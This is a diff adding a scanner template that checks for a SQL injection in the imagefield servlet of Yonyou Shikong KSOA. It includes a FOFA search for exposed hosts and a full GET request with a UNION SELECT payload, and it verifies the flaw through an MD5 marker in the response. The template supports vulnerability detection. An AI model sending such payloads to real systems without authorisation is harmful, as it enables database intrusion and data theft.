@@ -1,0 +1,25 @@
+## id: VEID-2024-0409
+## name: 用友时空KSOA-imagefield接口存在SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description: 用友时空KSOA imagefield接口存在SQL注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
+## fofa-query: app="用友-时空KSOA"
+## verification: true
+
+
+GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%272%27))--+ HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+
+#@ condition: and
+#@ matcher: body contains "c81e728d9d4c2f636f067f89cc14862c"
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 79b5f4b751a8fa3de7cbf34817e632c9632c3078f437d52f63b5335392807ac7
